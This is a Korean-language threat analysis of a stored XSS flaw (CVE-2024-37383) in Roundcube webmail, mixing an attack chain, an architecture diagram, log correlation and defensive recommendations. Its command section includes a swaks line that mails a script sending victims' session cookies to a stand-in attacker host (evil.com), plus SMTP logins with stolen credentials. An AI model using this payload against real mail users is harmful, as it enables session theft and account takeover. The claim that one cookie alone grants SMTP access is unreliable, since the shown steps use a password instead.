## Context

**Tactic**: Initial Access → Discovery → Exploitation → Credential Access → Lateral Movement  
**Technique**:

- T1046: Service Discovery
- CWE-79: Stored Cross-Site Scripting (XSS)
- T1078: Valid Accounts (via Session Hijacking)

**Procedure**:
- 공격자는 웹메일 서비스가 `Roundcube`임을 식별하고, `80`/`443` 포트를 통해 접근 가능한 로그인 UI를 발견한다.  IMAP (`993`), SMTP (`587`) 배너를 통해 `Dovecot`, `Postfix` 구성도 파악할 수 있다.  
- 이후 **CVE-2024-37383** 저장형 XSS 취약점을 포함한 메일을 발송하여 **브라우저 내 세션 쿠키(`PHPSESSID`)를 탈취**한다. 이 쿠키는 Roundcube에서의 인증 상태 전체를 대표하며, 세션 저장소(Redis/MySQL)를 통해 IMAP/SMTP 권한까지 연계되기 때문에 **쿠키 1개 탈취만으로 전체 계정이 장악**된다.

탈취된 쿠키는 다음과 같은 방식으로 인증 우회에 사용된다.
1. Roundcube 웹 UI에 접속 (쿠키 삽입)
2. PHP 세션으로 자동 로그인
3. 내부 SMTP 서버에 로그인 (`sasl_username=alice`)
4. 정상 사용자 권한으로 외부 메일 전송 성공 이 과정은 단순한 XSS 공격이 아니라, 웹 기반 인증 계층이 프로토콜 인증까지 연결된, 구조적 결함에 의한 **시스템 관통형 세션 하이재킹**이다.

## Core Idea

웹메일 시스템은 겉으로 보기에 단일한 애플리케이션처럼 보이지만, 실제로는 다음과 같은 구조와 흐름으로 동작한다.

```
        [ User (Browser) ]
                |
        HTTPS (TLS 443)
                v
     +----------------------+
     |  Nginx Reverse Proxy |  <-- TLS Termination
     +----------------------+
                |
        FastCGI (PHP-FPM)
                v
     +------------------------+
     |   Roundcube Webmail    |  <-- Auth Session (PHPSESSID)
     |  - Acts as MUA (IMAP)  |  <-- XSS Injection Point
     |  - SMTP Submission UI  |
     +-----------+------------+
                 |
         +-------+--------+
         | Authentication |
         | Session Store  |  <-- Redis / MySQL backend
         +----------------+
         |               |
  IMAP over SSL     SMTP with STARTTLS
     (993)               (587)
       |                   |
+------v------+     +------v------+
|  Dovecot    |     |  Postfix    |
| (IMAP Auth) |     | (SMTP Auth) |  <-- Valid Accounts (T1078)
+------+------|     +------+------+
       |                   |
       |             +-----v------+
       |             | Rspamd AV  |  <-- Spam, Virus Filtering
       |             +------------+
       |
+------v------+
|   Maildir   |  <-- Local Mail Delivery (LDA)
+-------------+

                === Threat Flow ===

    [XSS Injection in Roundcube UI]
                     ↓
    [Cookie Theft → PHPSESSID hijack]
                     ↓
    [Session Reuse for SMTP AUTH]
                     ↓
    [Postfix: Outbound Spam via stolen session]
```

**컴포넌트별 역할과 보안 고려사항:**

|**컴포넌트**|**역할**|**주의할 점**|
|---|---|---|
|**Browser**|사용자 진입점|XSS 실행 위치|
|**Nginx**|TLS 종료|인증 경계 없음|
|**Roundcube**|Web UI, MUA 역할|인증 세션 유지, 공격 표면|
|**Session Store**|인증 상태 유지|탈취 시 권한 탈취로 직결|
|**Dovecot**|메일 수신 처리 (IMAP)|인증 정보 로깅|
|**Postfix**|메일 발송 처리 (SMTP)|인증 후 외부 메일 가능|
|**Rspamd**|필터 계층|악성 페이로드 필터링|
|**Maildir**|메일 저장소|공격자 메일 주입 가능|

이 구조에서 **세션 쿠키는 시스템의 인증 상태 전체를 대표하는 단일 키**이다. 공격자는 이 키 하나만으로 다음을 수행할 수 있다.

- 사용자 권한으로 IMAP 수신
- SMTP 인증 후 외부 메일 발신
- 전체 Roundcube UI 접근

## Code / Experiment

**1. 서비스 탐지 및 배너 수집**

```bash
openssl s_client -connect imap.example.com:993
openssl s_client -connect smtp.example.com:587
```

**2. 악성 XSS 메일 발송 (저장형)**

```bash
swaks --to victim@example.com \
      --from attacker@example.com \
      --server smtp.example.com:587 \
      --auth LOGIN --auth-user attacker --auth-password 1234 \
      --data "Subject: XSS Test\n\n<script>fetch('http://evil.com/'+document.cookie)</script>"
```

**3. 탈취 세션 기반 인증 시도**

```bash
swaks --to admin@example.com \
      --from alice@example.com \
      --auth LOGIN --auth-user alice --auth-password stolen123 \
      --server smtp.example.com:587 --tls
```

**4. 로그 상관 분석**

```bash
grep "alice" /var/log/dovecot/imap-login.log
grep "sasl_username=alice" /var/log/mail.log
grep "PHPSESSID" /var/log/nginx/access.log
```

## Note

- Roundcube는 단순 웹 인터페이스가 아니다. `IMAP/SMTP 프로토콜`을 브라우저로 추상화해 전달하는 인증 게이트웨이이다.
    
- **인증 = 쿠키 1개인 시스템의 구조적 결함**
    - 일반적인 인증 시스템에서는 각 서비스(IMAP, SMTP, 웹 UI)가 독립적인 인증 체계를 가져야 하며, 경계가 명확히 분리되어야 한다. 그러나 Roundcube 환경에서는 이 모든 인증이 단일 PHP 세션에 의존한다.
    - `PHPSESSID` 쿠키는 브라우저-서버 간 인증을 처리하는 프론트엔드 메커니즘이지만, 동시에 `Dovecot(IMAP)`와 `Postfix(SMTP)`의 백엔드 인증까지 결정하는 "마스터 키"가 된다.
    - 이는 마치 호텔의 객실 키가 동시에 금고, 식당, 수영장 등 모든 시설을 열 수 있는 것과 같은 상황으로, 한 지점의 취약점이 전체 시스템 권한 탈취로 이어지는 위험한 구조이다.
- **웹 UI와 시스템 프로토콜 간 인증 연동의 설계 결함**
    - 이상적인 설계에서는 웹 애플리케이션(`Roundcube`)과 메일 프로토콜 서버(`Dovecot`/`Postfix`) 사이에 명확한 **신뢰 경계(Trust Boundary)**가 존재해야 한다.
    - 그러나 현재 구조에서는 `PHP 세션`이 자동으로 `IMAP/SMTP 서버`에 대한 **인증 프록시 역할**을 하면서, 인증 책임이 모호해진다.
        - 사용자는 웹 UI에서만 인증하지만, 그 인증이 자동으로 다른 모든 서비스로 전파된다.
        - 인증 토큰(세션 ID)이 브라우저 측에 저장되어 클라이언트 공격에 직접적으로 노출된다.
        - 백엔드 서비스들은 웹 서버에서 온 요청을 무조건 신뢰하는 구조이다.
- **DMZ 영역에서의 인증 문제**
    - **DMZ(DeMilitarized Zone)**는 내부망과 외부망 사이의 중간 영역으로, 보안 위험이 높은 구간이다.
    - `Roundcube`는 일반적으로 이 DMZ에 위치하여 외부에서 접근 가능하면서도 내부 메일 서버(`Dovecot`/`Postfix`)와 통신한다.
    - 문제는 이 DMZ에 위치한 애플리케이션이 내부 자원에 대한 인증을 직접 처리하면서도:
        - 다단계 인증(MFA)이나 세션 바인딩 같은 추가 보안 조치가 없다.
        - 세션 ID만으로 모든 권한이 부여되며, 이 ID는 JavaScript로 쉽게 탈취 가능하다.
        - 인증 토큰 갱신, 범위 제한, 사용 제한과 같은 방어 기법이 부재하다.
- 세션 쿠키 탈취 후 가능한 모든 동작은 다음과 같다:
    - Roundcube 로그인 상태 재현
    - IMAP 수신
    - SMTP 인증 우회
    - 사용자 설정 변경
    - 메일 필터 규칙 수정 (악성 메일 자동 처리)
    - 연락처 접근 및 수정
    - 자동 응답 설정 변경
    
- 공격 시나리오의 재구성 로그 조합
```
[Step 1] Apache (access_log)
    └▶ GET /?_task=mail&_uid=123&_mbox=INBOX
        Cookie: PHPSESSID=abcd1234
    ⇨ 웹 UI 기반 세션 접근 시도 감지
[Step 2] Dovecot (imap-login.log)
    └▶ Login: user=alice, method=PLAIN, rip=192.0.2.66
    ⇨ 탈취된 세션을 기반으로 IMAP 접속 시도
[Step 3] Postfix (mail.log)
    └▶ client=unknown[192.0.2.66], sasl_username=alice
    ⇨ 외부 발신 시도 성공 → 권한 재사용 성공
```

- 방어 전략
    - Roundcube의 `CSP/HTMLPurifier` 설정 강화
    - Redis/MySQL 세션 ID 보안 검증 추가 (IP 바인딩, 세션 수명 제한)
    - SMTP 인증 로그 기반 세션-아이디 상관 분석 스크립트 구축
    - `Rspamd 필터`에 JS 스니펫 탐지 규칙 삽입
    - 세션과 인증 분리: 웹 UI용 세션과 `IMAP/SMTP 인증`을 완전히 분리
    - 중요 작업(설정 변경, 외부 메일 발송)에는 2차 인증 도입

